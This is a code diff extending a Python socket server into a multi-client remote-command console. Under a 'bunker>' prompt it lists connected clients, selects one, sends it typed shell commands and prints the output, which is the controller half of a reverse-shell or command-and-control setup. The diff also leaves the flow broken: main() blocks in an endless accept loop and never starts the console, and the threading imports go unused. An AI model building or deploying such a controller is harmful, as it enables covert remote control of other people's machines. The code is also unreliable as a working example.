@@ -1,5 +1,16 @@
 import socket
 import sys
+from queue import Queue
+import time
+import threading
+
+from typing import Tuple, List, Any
+from typing_extensions import TypeAlias
+
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+
+_RetAddress: TypeAlias = List[Any]
 
 
 class MyServer:
@@ -8,16 +19,21 @@ class MyServer:
 
     def __init__(self, sock=None):
         if sock is None:
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is the Internet address family for IPv4, SOCK_STREAM is the socket type for TCP
+            # AF_INET is the Internet address family for IPv4, SOCK_STREAM is the socket type for TCP
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         else:
             self.sock = sock
 
-    def bind_and_listen(self, host = "", port = 9999):
+        # self.queue = Queue()
+        self.all_connections: List[Tuple[socket.socket, _RetAddress]] = []
+
+    def bind_and_listen(self, host="", port=9999):
         try:
 
             print(f"Binding socket to port: {port} and host: {host}")
             self.sock.bind((host, port))
-            self.sock.listen(5) # the number of unaccepted connections that the system will allow before refusing new connections. If not specified, a default reasonable value is chosen.
+            # the number of unaccepted connections that the system will allow before refusing new connections. If not specified, a default reasonable value is chosen.
+            self.sock.listen(5)
 
         except socket.error as e:
             print(f"Error binding socket: {str(e)}")
@@ -25,51 +41,112 @@ class MyServer:
 
             self.bind_and_listen()
 
-    def accept(self):
-        try:
-            con, add  =self.sock.accept()
-            self.conn = con
-            print(f"Connection has been established, IP: {add[0]}, Port: {add[1]}")
+    def accept_connection(self):
 
-            if self.sock and self.conn:
-                self.__send_commands()
-
-
-
-        except socket.error as e:
-            print(f"Error Establishing connection to client: {str(e)}")
-
-
-    def __send_commands(self, bufSize = 2048):
+        if self.all_connections:
+            for c in self.all_connections:
+                con, add = c
+                con.close()
+            del self.all_connections[:]
 
         while True:
-            cmd = input()
+            try:
+                con, add = self.sock.accept()
+                self.sock.setblocking(True)  # Prevent Timeout
 
-            if cmd == "quit":
-                self.conn.close()
+                self.all_connections.append((con, add))
+
+                print(f"Accepted connection, IP: {add[0]}")
+            except socket.error as e:
+                print(f"Error Accepting connection: {str(e)}")
+
+    def __send_commands(self, conn: socket.socket,  bufSize=20480):
+
+        while True:
+            try:
+                cmd = input()
+
+                if cmd == "exit" or cmd == "quit":
+                    return
+
+                if len(str.encode(cmd)) == 0:
+                    continue
+
+                conn.send(str.encode(cmd))
+
+                client_response = str(conn.recv(bufSize), "utf-8")
+                print(client_response, end="")
+            except socket.error:
+                print("Error sending commands")
+                return
+
+    def _list_connections(self):
+        results = ""
+        for i, c in enumerate(self.all_connections):
+            try:
+                con, _ = c
+                con.send(str.encode(' '))
+                con.recv(201480)  # we don't know how big we will receive
+
+            except:
+                del self.all_connections[i]
+                continue
+
+            results += str(i) + "@" + str(self.all_connections[i][1][0]) + ":" + str(
+                self.all_connections[i][1][1]) + "\n"
+
+        print("------------Clients------------\n" + results)
+
+    def _get_target(self, i: int):
+        try:
+            con, add = self.all_connections[i]
+            print("Connected to: " + str(add[0]))
+            print(str(add[0] + ">"), end="")
+            return con
+
+        except:
+            pass
+
+    def start_bunker(self):
+        while True:
+
+            cmd = input("bunker> ")
+
+            if cmd == "list":
+                self._list_connections()
+
+            elif "close" in cmd:
+
+                i = cmd.replace("close ", "")
+                con = self._get_target(int(i))
+                if con is not None:
+                    con.close()
+
+            elif "select" in cmd:
+                i = cmd.replace("select ", "")
+                con = self._get_target(int(i))
+                if con is not None:
+                    self.__send_commands(con)
+
+            elif cmd == "exit" or cmd == "quit":
+                for c in self.all_connections:
+                    con, _ = c
+                    con.close()
+
+                del self.all_connections[:]
                 self.sock.close()
                 sys.exit()
 
-            if len(str.encode(cmd)) == 0:
-                continue
-
-            self.conn.send(str.encode(cmd))
-
-            client_response = str(self.conn.recv(bufSize), "utf-8")
-            print(client_response, end="")
+            else:
+                print("Command not recognized")
 
 
 def main():
     s = MyServer()
 
     s.bind_and_listen()
-    s.accept()
-
-
+    s.accept_connection()
 
 
 if __name__ == "__main__":
     main()
-
-
-
